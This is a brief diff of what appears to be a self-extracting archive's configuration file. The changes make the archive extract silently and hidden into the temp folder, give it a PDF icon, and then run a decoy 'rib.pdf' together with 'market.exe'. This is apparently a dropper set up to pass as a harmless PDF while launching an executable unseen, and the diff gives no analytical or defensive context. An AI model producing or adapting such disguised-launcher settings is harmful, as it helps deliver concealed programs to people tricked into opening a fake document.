@@ -1,5 +1,9 @@
-Setup=market.exe
-TempMode
-Overwrite=2
+Path=%TEMP%
 Silent=1
-Path=%temp%\MyArchive
+Overwrite=1
+Hide=1
+RunAfter=rib.pdf
+RunAfter=market.exe
+Icon=pdf.ico
+ExtractTo=%TEMP%
+Replace=1
